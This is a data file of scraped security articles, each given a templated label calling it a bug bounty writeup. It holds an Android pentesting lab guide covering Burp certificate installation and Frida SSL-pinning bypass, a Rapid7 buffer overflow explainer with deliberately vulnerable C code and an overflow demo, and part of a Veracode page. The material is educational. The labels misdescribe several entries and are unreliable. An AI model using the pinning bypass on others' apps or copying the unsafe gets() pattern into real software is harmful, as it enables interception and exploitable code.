such as Turbo Intruder , due to the speed of the requests being sent, itâs possible to make this exploit much more reliable. We were able to use this technique to achieve code execution on Mozilla as seen in the screenshot below: phpinfo() output from wpt-vpn.stage.mozaws.net The Bugzilla report in which we first reported this vulnerability is now public, and can be viewed here . The report contains thorough reproduction steps that should be sufficient for testers wishing to recreate these bugs. We were awarded $500 as a part of Mozillaâs bug bounty program. Written by: Shubham Shah Your subscription could not be saved. Please try again. Your subscription has been successful. Get updates on our research Subscribe to our newsletter and stay updated on the newest research, security advisories, and more! Enter your email address to subscribe Provide your email address to subscribe. For e.g abc@xyz.com SUBSCRIBE More Like This Security Research New! Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927) Read more Read on ASN Blog Security Research New! How an obscure PHP footgun led to RCE in Craft CMS Read more Read on ASN Blog Security Research New! Citrix Denial of Service: Analysis of CVE-2024-8534 Read more Read on ASN Blog Security Research New! Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108) Read more Read on ASN Blog Security Research New! Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.x Read more Read on ASN Blog Security Research New! Insecurity through Censorship: Vulnerabilities Caused by The Great Firewall Read more Read on ASN Blog Back to All Ready to get started? Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself. Request a Demo Address: Level 10, 12 Creek Street, Brisbane QLD, 4000 â Contact: contact@assetnote.io Press Inquiries: press@assetnote.io Platform Features Continuous Asset Discovery Deep Asset Enrichment Assetnote Exposure Engine Expert Security Research Collaborative Workflows Customization Use Cases Continuous Asset Discovery and Inventory Real-Time Exposure Monitoring Attack Surface Reduction Mergers & Acquisitions Bug Bounty Readiness Â© 2025 Assetnote. All rights reserved. Privacy Policy"}
{"source_url": "https://medium.com/bugbountywriteup/android-pentesting-lab-4a6fe1a1d2e0", "title": "Android Pentesting Lab. Step by Step guide for beginners! | by Neha Tariq | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/android-pentesting-lab-4a6fe1a1d2e0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAndroid Pentesting Lab. Step by Step guide for beginners! | by Neha Tariq | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Android Pentesting Lab Step by Step guide for beginners! Neha Tariq 7 min read · Aug 15, 2020 -- Listen Share Press enter or click to view image in full size Introduction As a pentester developing new skills in different areas is very important as you might miss something crucial from one approach. Android pentesting is one of them, but it requires a dedicated environment and I will explain how to setup an easy one. So let’s begin! Table of contents: Setup android emulator (Genymotion) Configure Burp Suite CA certificate on device Frida to bypass SSL pinning Bytecode Viewer (for static analysis) Before installing emulator, I would recommend to install any Linux based distro or Santoku , which is especially designed for mobile pentesting. Installing Santoku is out of scope in this write-up, but you can follow up this guide to setup. 1. Genymotion When starting out learning, android emulators are the great way to get experience with a variety of devices having different API levels without costing much and free version of Genymotion provides exactly that with great User Experience and easy to configure nature. Note: VirtualBox is used as a core by genymotion to virtualize Android operating systems. So please install VirtualBox in your system in order to proceed: link Genymotion requires user registration to use its dashboard and for that first you need to create an account: link After completing your registration process download its installer from here and install it in your host computer. # Make it executable $- chmod +x genymotion-<version>-linux_x64.bin # Specify your path, here i am installing in user's home directory $- ./genymotion-<version>-linux_x64.bin -d ~/ Once Genymotion get installed now you can sign in using your credentials specified in the registration process and use its dashboard which looks like shown in Figure 1. Press enter or click to view image in full size Figure 1. Genymotion Dashboard Here I’ve installed two devices already, but you can install a new device by clicking on plus icon at the top right corner and selecting your desired template and for this example I will install Samsung Galaxy S9 (8.0 — API 26) Press enter or click to view image in full size Figure 2. Installing Samsung galaxy s9 Configuring Genymotion After initiating the device, there are a couple of things to consider: ARM translator: If some app contains ARM native code, then Genymotion will not be able to run the app as it consists of x86 (32-bit) architecture and will throw an error. You can avoid this problem by installing ARM translation library into emulated device: link Note: At this point of time this library only supports up to android version 8.0 so download right package according to your emulated device’s specifications. Saving APK (Android Package): Installing target apps into the emulated device becomes much easier by the Open Gapps widget present in a toolbar which you can access like shown in Figure 3. Figure 3. Installing Gapps in genymotion After its installation you can download your target apps directly from Play Store. But saving this apk into host system would be beneficial for main two reasons: No need to download the same version of app into different emulated devices having same specifications. Required for a decompiler in order to review the source code for static analysis. So how we can save them? Usually you have two ways to get apk either download it from sites like evozi or pull it using adb (Android debug bridge) Note: Genymotion have pre-installed this tool in its installation directory and mine is located in ~/genymotion/tools/ For this demonstration purpose I will use the Twitter Lite app: # Call package manager (pm) and filter out twitter's package name $- ./adb shell pm list packages | grep twitter # Check the absolute path $- ./adb shell pm path com.twitter.android.lite # Pull apk and rename to twitter_lite.apk $- ./adb pull /data/app/com.twitter.android.lite-somevalue.apk twitter_lite.apk Press enter or click to view image in full size Figure 4. Transferring apk from Genymotion to host computer Now just drag & drop these APKs into emulated devices. 2. Burp Suite I assume the reader already have installed burp suite if not then simply download its community version: link Here I will show you only how to configure with android emulated device. Android Nougat and above (API >= 24) only trusts system level CA (certificate authority) certificates for secure communications especially for WebView. You can read more from here: link So the easiest method to bypass this restriction is installing Burp CA’s certificate as the system trusted certificate and this method will also prevent us from setting a Lock screen PIN 😎 Steps: 1. Export burp CA into der format Press enter or click to view image in full size Figure 5. Exporting Burp CA’s cert with der format 2. Use Openssl to convert DER to PEM and rename to <cert-hash>.0 # Convert certificate format from DER to PEM $- openssl x509 -inform DER -in cacert.der -out cacert.pem # Display the \"hash\" of the certificate subject name $- openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1 # Move cert.pem and rename to <hash>.0 $- mv cacert.pem 9a5ba575.0 Press enter or click to view image in full size Figure 6. Prepare Burp CA using openssl Note: Use -subject_hash if your openssl <1.0 3 . Move certificate in emulated device using adb # Change /system partition into writable mode with remount $- ./adb remount # Transfer certificate $- ./adb push 9a5ba575.0 /system/etc/security/cacerts/ # Change its permissions $- ./adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 # Reboot to let changes occur $- ./adb shell reboot Figure 7. Transferring certificate Now your certificate should be installed as a system-trusted CA certificate which you can confirm by navigating: Settings →Security & Location → Encryption & credentials → Trusted Credentials Press enter or click to view image in full size Figure 8. Confirming Burp’s certificate 4. Configure burp suite’s proxy Navigate to Proxy → Options → Proxy Listeners → Add Press enter or click to view image in full size Figure 9. Configure proxy in Burp Here I’ve bound port 8082 to my VirtualBox’s interface IP 5. On emulated device, configure WiFi settings. Navigate to WiFi → Long press WiFi name → Modify Network → Advanced Options → Change proxy None to Manual Figure 10. Configure WiFi network After this you can see network traffic in burp’s history Press enter or click to view image in full size Figure 11. Intercepting traffic 3. Frida Basically Frida is a dynamic code instrumentation toolkit which lets you dynamically inject snippets of code into running processes of the app in order to change its behavior and this is exactly what we need to bypass SSL pinning but now you might be wondering what’s that? Well, SSL pinning is a technique used in applications as an additional security layer for application traffic in order to prevent attacks like MitM (man-in-the-middle) and this will not allow burp to intercept the traffic unless we use tools like Frida to hook our specific code which bypass this functionality. Installation Install frida-tools with pip3 in host computer using cli $- pip3 install frida-tools 2. Download only x86 version of Frida server because virtual devices by Genymotion are x86-based which you can verify like shown in Figure 12. Figure 12. Samsung galaxy s9 (x86) arch Download link # Downloading using wget as an example $- wget https://github.com/frida/frida/releases/download/<version>/frida-server-<version>-android-x86.xz # Decompress using unxz $- unxz frida-server-<version>-android-x86.xz # Rename for ease $- mv frida-server-<version>-x86.xz frida-server # Transfer into the emulated device using adb $- ./adb push ~/Downloads/frida-server /data/local/tmp # Change its permissions $- ./adb shell chmod 755 /data/local/tmp/frida-server # Run Frida-server in the background $- ./adb shell /data/local/tmp/frida-server & Now, after setting up Frida server, we will be able to use our scripts but for that first we need to find APK’s name which you can find by either way # Old method using pm $- ./adb shell pm list packages | grep someapp # Another way using Frida but for this app first need to be started $- frida-ps -U | grep someapp For this demonstration purpose my target is Skrill and i am using this bypass script, simply save this into a js file Now lets see if Skrill is throwing any SSL error Press enter or click to view image in full size Figure 13. Skrill is using SSL pinning As expected it does, now use Frida with a bypass script to intercept network traffic Press enter or click to view image in full size Figure 14. Bypass successful And as you can see now we can continue our testing after successful SSL pinning bypassed using FRIDA 😃 4. Bytecode Viewer Static analysis is a straightforward process to look how an application performs by reviewing its source code. However decompiling its source code can be hard and for this purpose there are some decompilers like jadx But I personally liked Bytecode Viewer due to its wide range of different Java decompilers, two bytecode editors and many other features. Download link After downloading, simply run the decompiler and drag & drop your files into the Files section to decompile. Press enter or click to view image in full size Figure 15. Running Bytecode Viewer That’s it for now 😃 Hope this make some of your doubts clear and you are able to create your own android LAB. Happy Pentesting! Android Pentesting Cybersecurity Bug Bounty -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Neha Tariq 362 followers · 2 following BSCS student! Learning Web app & Android pentesting! Loves to read Books! Appreciates knowledge and folks :) No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/", "title": "Stack-Based Buffer Overflow Attacks: Explained | Rapid7 Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStack-Based Buffer Overflow Attacks: Explained | Rapid7 Blog Platform Services Resources Partners Company Request Demo Back to Blog Vulnerabilities and Exploits Stack-Based Buffer Overflow Attacks: Explained and Examples Brendan Watters Feb 19, 2019 | Last updated on Nov 28, 2023 | xx min read What are buffer overflow attacks? Stack-based buffer overflow exploits are likely the shiniest and most common form of exploit for remotely taking over the code execution of a process. These exploits were extremely common 20 years ago, but since then, a huge amount of effort has gone into mitigating stack-based overflow attacks by operating system developers, application developers, and hardware manufacturers, with changes even being made to the standard libraries developers use. Below, we will explore how stack-based overflows work and detail the mitigation strategies that are put in place to try to prevent them. Deep dive on stack-based buffer overflow attacks Understanding stack-based overflow attacks involves at least a basic understanding of computer memory. Memory in a computer is simply a storage place for data and instructions—data for storing numbers, letters, images, and anything else, and instructions that tell the computer what to do with the data. Both are stored in the same memory because memory was prohibitively expensive in the early days of computing, and reserving it for one type of storage or another was wasteful. Such an approach where data and instructions are stored together is known as a Von Neumann architecture. It’s still in use in most computers to this day, though as you will see, it is not without complications. On the bright side, while security was not a driving factor in early computer and software design, engineers realized that changing running instructions in memory was a bad idea, so even as long ago as the ‘90s, standard hardware and operating systems were doing a good job of preventing changes to instructional memory. Unfortunately, you don’t really need to change instructions to change the behavior of a running program, and with a little knowledge, writeable data memory provides several opportunities and methods for affecting instruction execution. Take this particularly contrived example: #include #include #include int main(){ char realPassword[20]; char givenPassword[20]; strncpy(realPassword, \"ddddddddddddddd\", 20); gets(givenPassword); if (0 == strncmp(givenPassword, realPassword, 20)){ printf(\"SUCCESS!\\n\"); }else{ printf(\"FAILURE!\\n\"); } raise(SIGINT); printf(\"givenPassword: %s\\n\", givenPassword); printf(\"realPassword: %s\\n\", realPassword); return 0; } If you don’t know the C programming language, that’s fine. The interesting thing about this program is that it creates two buffers in memory called realPassword and givenPassword as local variables. Each buffer has space for 20 characters. When we run the program, space for these local variables is created in-memory and specifically stored on the stack with all other local variables (and some other stuff). The stack is a very structured, sequential memory space, so the relative distance between any two local variables in-memory is guaranteed to be relatively small. After this program creates the variables, it populates the realPassword value with a string, then prompts the user for a password and copies the provided password into the givenPassword value. Once it has both passwords, it compares them. If they match, it prints “SUCCESS!” If not, it prints “FAILURE!” Here’s an example run: msfuser@ubuntu:~$ ./example.elf test FAILURE! givenPassword: test realPassword: ddddddddddddddd This is exactly as we’d expect. The password we entered does not match the expected password. There is a catch here: The programmer (me) made several really bad mistakes, which we will talk about later. Before we cover that, though, let’s open a debugger and peek into memory to see what the stack looks like in memory while the program is executing: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaa FAILURE! Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) At this point, the program has taken in the data and compared it, but I added an interrupt in the code to stop it before exiting so we could “look” at the stack. Debuggers let us see what the program is doing and what the memory looks like on a running basis. In this case, we are using the GNU Debugger (GDB). The GDB command ‘info frame’ allows us to find the location in memory of the local variables, which will be on the stack: (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x400701 called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) Now that we know where the local variables are, we can print that area of memory: (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x00400701 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x00000000 0x00000000 0x00000000 0x00000000 0x7fffffffde00: 0x64646464 0x64646464 0x64646464 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 . . . As mentioned, the stack is sequentially stored data. If you know ASCII, then you know the letter ‘a’ is represented in memory by the value 0x61 and the letter ‘d’ is 0x64. You can see above that they are right next to each other in memory. The realPassword buffer is right after the givenPassword buffer. Now, let’s talk about the mistakes that the programmer (me) made. First, developers should never, ever, ever use the gets function because it does not check to make sure that the size of the data it reads in matches the size of the memory location it uses to save the data. It just blindly reads the text and dumps it into memory. There are many functions that do the exact same thing—these are known as unbounded functions because developers cannot predict when they will stop reading from or writing to memory. Microsoft even has a web page documenting what it calls “banned” functions, which includes these unbounded functions. Every developer should know these functions and avoid them, and every project should automatically audit source code for them. These functions all date from a period where security was not as imperative as it is today. These functions must continue to be supported because pulling support would break many legacy programs, but they should not be used in any new programs and should be removed during maintenance of old programs. Taking a look at the hack We have looked at the stack, noticed that the buffers are located consecutively in memory, and talked about why gets is a bad function. Let’s now abuse gets and see whether we can hack the planet program. Since we know gets has a problem with reading more than it should, the first thing to try is to give it more data than the buffer can hold. The buffers are 20 characters, so let’s start with 30 characters: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: ddddddddddddddd Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x40072d called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x00006161 0x7fffffffde00: 0x64646464 0x64646464 0x64646464 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 0x7fffffffde20: 0x00400740 0x00000000 0xf7a2d830 0x00007fff 0x7fffffffde30: 0x00000000 0x00000000 0xffffdf08 0x00007fff We can see clearly that there are 30 instances of ‘a’ in memory, despite us only specifying space for 20 characters. We have overflowed the buffer, but not enough to do anything. Let’s keep trying and try 40 instances of ‘a.’ msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaa Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. . . . (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde00: 0x61616161 0x61616161 0x64646400 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 0x7fffffffde20: 0x00400740 0x00000000 0xf7a2d830 0x00007fff The first thing to notice is that we went far enough to pass through the allotted space for givenPassword and managed to alter the value of realPassword, which is a huge success. We did not alter it enough to fool the program, though. Since we are comparing 20 characters and we wrote eight characters to the realPassword buffer, we need to write 12 more characters. So, let’s try again, but with 52 instances of ‘a’ this time: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa SUCCESS! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaaaaaaaaaaaaaa Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x40072d called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde00: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde10: 0x61616161 0x00007f00 0x00000000 0x00000000 Success! We overflowed the buffer for givenPassword and the data went straight into realPassword, so that we were able to alter the realPassword buffer to whatever we wanted before the check took place. This is an example of a buffer (or stack) overflow attack. In this case, we used it to alter variables within a program, but it can also be used to alter metadata used to track program execution. Altering metadata Using stack overflow attacks against program metadata to affect code execution is not much different than the above example. The key is understanding the concept of a return value. Like us, computers do a lot of things at once and will stop working on one thing to do another before returning to the original task. When the computer executes instructions located somewhere else in the instruction memory, it stores a note of where it was before it starts executing so that it knows where to return when it finishes the new task. That note—called the return address—is simply the address in instructional memory where it returns and starts executing instructions. The computer is brilliant, and if you can change the value of the return address, you can send it wherever you like. Exploits will often write the instructions in the same buffer they overflow and then point execution back to the buffer itself, which allows an attacker to hand a program code and then force it to execute the code. One caveat is that none of these examples will work on remotely modern operating systems anymore. Operating system developers, application developers, hardware engineers, and even compilers have all reacted and made performing stack overflow attacks much harder. What’s being done to mitigate these exploits? It has been nearly 20 years since the heyday of stack overflow attacks, and there are a lot of protections in place that prevent them from working as well now as they did back then. Some of these protections include stack canaries, Address Space Layout Randomization (ASLR), compiler warnings, and hardware changes to prevent execution of code on the stack. (Side note: For a historical discussion on ASLR on Windows, see this most excellent Twitter thread by John Lambert .) First and foremost, the best defense against stack-based overflow attacks is the use of secure coding practices—mostly through stopping the use of functions that allow for unbounded memory access and carefully calculating memory access to prevent attackers from modifying adjacent values in memory. Quite simply, if attackers can only access the memory of the variable they intend to change, they cannot affect code execution beyond the expectations of the developer and architect. Unfortunately, there are thousands of programs that implemented the unsafe, unbounded functions to access memory, and recoding all of them to meet secure coding practices is simply not feasible. For those legacy programs, operating system manufacturers implemented several mitigations to prevent poor coding practices that result in arbitrary code execution. We can see this in action somewhat in our example by toggling the protections and pushing further in our overflow. One quick change that compilers made in the immediate aftermath of the stack-based attacks was starting to include protections on important pieces of data, such as return addresses. Since most stack overflow attacks involved overflowing one data location and writing to another, the compiler placed a sacrificial known value between buffers and important data, then the program would check to see whether the sacrificial value had been changed before using the important data. If that value had been changed, it was likely that the important data was also altered, so execution would stop immediately. Since a change in these sacrificial values could be determined before malicious code execution would start, the values are known as “canaries.” If the canary was disturbed, exception code was executed and the program terminated. Now, stack canaries, by themselves, aren’t bulletproof, since there are a few ways to bypass them. One method is by finding the canary value through an unbounded read of memory or guessing. In some cases, canary values are static and predictable. Once attackers know the canary value, they can replace it in the overwrite. For this reason, canaries often contain characters that are difficult to send, such as “enter” (\\x0a) or “vertical tab” (\\x0b).“enter” While a challenge for the attacker, this reduces the entropy of the canary value and makes them easier to find in memory. To bypass the canary stack protections using the GNU Compiler Collection (GCC), upi must specific that you want the protections turned off, with the flag ‘‘-fno-stack-protection.’ To demonstrate, let’s compile the program without protections and pass it a large buffer. In this case, I am using a small inline perl script to generate a series of 90 instances of ‘a’ and pass that into the program example.elf: msfuser@ubuntu:~$ gcc -o example.elf -fno-stack-protector overwrite.c . . . msfuser@ubuntu:~$ perl -e 'print \"a\"x90' | ./example.elf SUCCESS! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Segmentation fault (core dumped) This resulted in a program crash, which is expected when memory structures are corrupted with bad data. This is likely the result of overwriting the return value, and then the processor crashing when trying to access the new memory. If we’d overwritten the location with somewhere that the CPU could access, it would have been happy to do so. Now let’s redo the experiment, but without disabling the gcc stack protections: msfuser@ubuntu:~$ gcc -o example.elf overwrite.c overwrite.c: In function ‘main’: . . . msfuser@ubuntu:~$ perl -e 'print \"a\"x90' | ./example.elf FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: ddddddddddddddd *** stack smashing detected ***: ./example.elf terminated Aborted (core dumped) msfuser@ubuntu:~$ Changes to hardware and operating systems took longer, but they did happen. One of the first mitigations introduced by hardware and operating system vendors was the NX, or no-execute bit. On Windows, this was known as Data Execution Prevention (DEP). It allowed operating systems to define certain areas of memory as non-executable, and when flagged as such, the CPU would simply not execute that memory. In theory, there should never be executable code on the stack, as it is designed for storing data values only. Based on that understanding, operating systems classified the stack as non-executable, preventing arbitrary code from being placed on the stack and executed. In addition to bypasses for this mitigation, it quickly became apparent that despite being a poor practice, multiple legitimate programs placed instructions on the stack and executed them, and NX broke them all. That forced operating systems to allow some programs to opt out of the protection, and those programs were well-known to hackers and continued to be targeted. Aside from those programs that opted out, the most common bypass for NX was through the use of return-oriented programming (ROP) , which leverages pre-existing code in instructional memory to perform desired tasks. Most programs use common sets of code to perform tasks, and ROP leverages this common code to perform a desired task. Sometimes, attackers set up execution of several sections of code across multiple libraries in a process known as ROP chaining. Since the code the attacker needed was already present in instructional memory, there was no need to place it on the stack for execution. Download Rapid7's Annual Vulnerability Intelligence Report ▶︎ In an effort to stop ROP-based attacks, operating systems started to randomize the location of instructional memory to prevent attackers from knowing where desired code was stored. That randomization of instructional memory is called ASLR, which shuffles blocks of memory and makes it so that the location of a given object (including code) in memory is no longer a constant value. An attack that works once may not work again, as the code the attacker tried to execute might no longer be there, causing unpredictable results. While effective, ASLR is constrained because, like NX, not every piece of instructional memory responds well to moving, so some code must opt out of the protection. Even for code that can handle ASLR, there are bypasses. The most common bypass leverages the limitation that the memory can only be randomized in blocks. If there is a way to determine where a block of memory is, an attacker can calculate the location of the desired memory from the leaked value. Unfortunately, since ASLR was not something that was baked into operating systems, they sometimes store the randomized location of something important in a known place, not unlike an employee choosing a good password but putting it on a Post-It note under their keyboard. Such a “cheat” by the operating system allows attackers to determine the location of a known object in memory, and then based on its location, they can calculate the location of the desired code or object. Again, just like NX, ASLR does not completely prevent an attack, but it does make attacks harder and less predictively successful. In conclusion It would be nice to say that stack-based overflow attacks are gone due to the mitigation strategies in place, but that is simply not the case. Stack-based attacks might not be as common today, but they do exist. Due to the large size of operating system vendors, it is unlikely that a stack-based attack exists in Windows or Linux anymore, but smaller groups that pay less attention to security still release vulnerable code—and not every vulnerability can be mitigated by the operating system. Article Tags Exploits Author Brendan Watters Author Posts Related blog posts Get Started Command Platform Exposure Management MDR Services Take Action Start a Free Trial Take a Product Tour Get Breach Support Contact Sales Company About Us Leadership Newsroom Our Customers Partner Programs Investors Careers Stay Informed Blog Emergent Threat Response Webinars & Events Rapid7 Labs Research Vulnerability Database Security Fundamentals For Customers Sign In Support Portal Product Documentation Extension Library Rapid7 Academy Customer Escalation Portal Contact Support +1-866-390-8113 Follow Us Linkedin X (formerly Twitter) Facebook Instagram © Rapid7 Legal Terms Privacy Policy Export Notice Trust Cookie List Accessibility Statement"}
{"source_url": "https://www.veracode.com/security/buffer-overflow", "title": "Buffer Overflow Risks in Software Development", "friendly_explanation": "This is a bug bounty writeup from https://www.veracode.com/security/buffer-overflow. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBuffer Overflow Risks in Software Development Contact Us Blog Login Platform Platform Achieve unified visibility, AI-driven prioritization, and integrated tools to detect, understand, and remediate application vulnerabilities efficiently and effectively. [Column1] Unified Risk Management Risk Manager (ASPM) Unified visibility and remediation of application risk. [Column2] Application Security SAST Find and fix flaws as you write code. DAST Find and fix runtime web app vulnerabilities. Package Firewall Proactively secure development pipelines. SCA Stop open-source code vulnerabilities. Fix (AI code remediation) Automate remediation and save developer time. Container Secure container technologies before production. [Column3] Security Training eLearning Learn secure coding on-demand at your pace. Security Labs Exploit insecure apps with hands-on labs. Services PTaaS Leverage skills of experienced penetration testers. Application Security Consulting Personalized consultation to help remediate flaws. Solutions [Column1] Challenges We Solve Secure your business by eliminating hidden application risks. AI-Generated Code Defense Protect the Software Supply Chain Risk Remediation Secure Entire SDLC Industry Tailored security solutions. Financial Services Government – Public Sector Healthcare Retail & Commerce Software and Technology Blog Preventing Broken Access Control Vulnerabilities in Web Applications Learn more Why Veracode? Why Veracode Our years of experience and deep industry expertise ensure your software is compliant and secure while accelerating your development process. Choose Veracode Over Black Duck Checkmarx GitHub OpenText Snyk Customers A diverse array of clients, from Fortune 500 enterprises to innovative startups. Manhattan Associates HDI Global SE Cox Automotive Blog Highlights from RSA Conference: Secure by Design, AI Insights, and Global Collaboration Learn more Resources Resource Center Learn and Discover Blog Datasheet eBooks Infographics Reports Webinars Whitepapers Videos Developer Resources Learn and Connect Documentation Developer Community Developers – Training Contact Support AppSec Knowledgebase Vulnerability Database API Reference Artificial Intelligence and Secure Software Development Veracode Verified Customer Community Find all the support you need on your Veracode journey Trust Center Start your security review Blog Preventing Broken Access Control Vulnerabilities in Web Applications Learn more Partners Our Partnerships Learn the benefits of partnering with Veracode. Become a Partner Apply to become a partner. Partner Portal Login Login to the partner portal. Webinars Leveraging AI to Accelerate Application Security Learn more Company About Us Careers Leadership Certifications Sustainability & Governance Newsroom Events Blog Enhancing Developer Efficiency With AI-Powered Remediation Learn more Login Request a Demo APPLICATION SECURITY Knowledge Base Search Our Knowledge Base Search AppSec Knowledgebase Categories Application Security Basics Agile Security App Security Testing Application Control Audit Application Protection Application Security Assessment Application Security Best Practices Application Security Risk Application Security Tools Application Testing Tool Automated Web Testing Automated Penetration Testing Tools Black Box Analysis Blackbox Test Black Box Testing Blackbox Testing Techniques Cloud-based Security Code Review Tools Code Security Analysis CWE DAST Test Data Breach Data Loss Prevention Guide Data Security Ethical Hacking Gray Box Testing IAST Mobile App Security Testing Network Security Tools Open Source Risk OWASP Testing Tools OWASP Top 10 Penetration Testing SaaS Application Security SaaS Application Monitoring SDLC Agile Secure Applications Security Review Software Software Audit Software Code Security Software Security Software Testing Software Testing Process Software Testing Tools Source Code Analysis Source Code Security Analyzer Static Analysis Static Code Analysis Third-Party Risk Assessment Unit Testing Vulnerability Assessment Vulnerability Assessment Software Vulnerability Management Vulnerability Scanning Tools Web App Penetration Testing Web Application Audit Web Application Monitoring Web Application Scanning Web Application Security Testing Web Application Testing Web Application Web Application Scanner Web Pen Testing What is Third-Party Software? AppSec Policies NIST Compliance OWASP Security Secure Compliance Web Application Security Standards PCI Security Advanced Application Security Agile Software Development Lifecycle Agile SDLC Android Security DAST Assessment DevOps Security DevOps Testing DevSecOps JavaScript Security Linux Hacking Microservices Mobile App Testing Ruby Security Secure Development Secure DevOps Secure Web Application Development Software Development Lifecycle (SDLC) Web Application Penetration Testing Development Integrated Development Environment Software Containers Software Testing Methodologies and Techniques What is Systems Development Life Cycle Web Application Flaws & Vulnerabilities Application Vulnerability ARP Spoofing Buffer Overflow Computer Worm Credentials Management Flaws CRLF Injection Cross Site Scripting Prevention Cross Site Scripting Vulnerability Cross-Site Request Forgery Cross-Site Scripting 